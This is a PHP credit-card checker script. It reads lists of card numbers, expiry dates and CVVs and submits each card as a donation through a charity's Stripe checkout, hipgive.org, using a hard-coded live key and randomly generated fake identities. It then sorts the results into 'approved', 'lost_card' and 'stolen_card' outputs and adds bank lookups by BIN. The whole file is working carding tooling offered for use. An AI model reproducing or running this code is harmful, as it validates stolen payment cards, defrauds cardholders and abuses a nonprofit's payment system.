<?php

////////////////////////////===[........................]

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr2($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function strposa($haystack, $needles=array(), $offset=0) {
    $chr = array();
    foreach($needles as $needle) {
        $res = strpos($haystack, $needle, $offset);
        if ($res !== false) $chr[$needle] = $res;
    }
    if(empty($chr)) return false;
    return min($chr);
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html',
'Sec-Fetch-Mode: cors',
'sec-fetch-site: same-site',
 'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2Fa44017d)&user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+SM-A505GN)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F83.0.4103.96+Mobile+Safari%2F537.36&device_id=a16af626-3e73-45c9-9ba0-033e6c98e3f9&referrer=https%3A%2F%2Fhipgive.org%2Fdonate%2F%3Ftab%3Dpay%26pid%3D61362&pasted_fields=number&time_checkout_opened=1591869689&time_checkout_loaded=1591869689&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&card[address_zip]=76450&time_on_page=32062&guid=bb3cdeea-fc06-4b48-a8ba-55288ca2893e&muid=f215215a-658e-40bf-8f56-4377dd3b5a02&sid=de94eb8b-f18b-46e7-812e-defe5f468d50&key=pk_live_UiypA2fdZJi1FEclcCUcvXs500T59cXjOT');

$resulta = curl_exec($ch);
$resulta1 = json_decode($resulta, true);

$message = trim(strip_tags(getStr2($resulta,'"message": "','"')));
$code = $resulta1['error']['code'];
$dcode = $resulta1['error']['decline_code'];
$token = $resulta1['id'];
$cvc = trim(strip_tags(getStr2($resulta,'"cvc_check": "','"')));
curl_close($ch);
///====2nd req========///

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://data.hiponline.org/api/hipgive/11e8e62a-a840-4417-8a76-b5ef56d98cd8/donation');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: data.hiponline.org',   
   'accept: application/json, text/plain, */*',
   'origin: https://hipgive.org',
   'content-type: application/json;charset=UTF-8',
   'X-Requested-With: XMLHttpRequest',
   'referer: https://hipgive.org/donate/?tab=pay&pid=61362',
   'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
   'sec-fetch-mode: cors',
));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"identity":"11e8e62a-a840-4417-8a76-b5ef56d98cd8","wp_donation_id":72892,"token_id":"'.$token.'","project":"AGREGA. So no one will be left hungry"}');

$resultb = curl_exec($ch);
$resultb1 = json_decode($resultb, true);
$mess2 = trim(strip_tags(getStr2($resultb,'{"status":"error","identity":"11e8e62a-a840-4417-8a76-b5ef56d98cd8","errors":["','"]}'))); 

////////////////////////////=====[Bank-Information]

function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3
//var_dump(json_decode($result, true));

if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$bin|$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$bin|Unknown.";
}
}




////////////////////////////===[Card Response]

if (strpos(resultb, '"status":"error"')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b>- > 🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
} elseif (strpos($resulta, '"cvc_check": "pass"')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> -> <b> 🔥 OUTCOME -> cvc_check: '.$cvc.' </span>  </br>';
}elseif (strpos($resulta, 'zip code you supplied failed validation')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i>- > [Code]: '.$mess3.' [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
} elseif (strpos($resulta, "Your card's security code is incorrect.")) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[03]</span> ¤ <span class="text-dark">#CCN</span> -> <span class="text-success"> [ CCN MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i> - > [Code]: '.$code.' [D-Code]: '.$message.' </span> </br>';
} elseif (strpos($resultb, 'Your card has insufficient funds.')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span></br>';
} elseif (strpos($resulta, 'Your card has insufficient funds.')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME [D-Code]: cvc_check: '.$cvc.' </span></br>';
} elseif (strpos($resulta, 'lost_card')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.' </span></br>';
} elseif (strpos($resulta, 'stolen_card')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
} elseif (strpos($resulta, '"cvc_check": "unavailable"')) {
    echo'<b><span class="badge badge-danger"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [Code]: '.$mess2.' [D-Code]: '.$dcode.' -> cvc_check: '.$cvc.' <b><i></span> </br>';
}elseif (strpos($resulta, 'pickup_card')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
} 
else {
    echo'<b><span class="badge badge-danger"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [D-Code]: '.$dcode.' -> '.$code.' <b><i></span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response



///////////////////////////////////////////////===========================Edited By Tonami_YT ================================================\\\\\\\\\\\\\\\
?>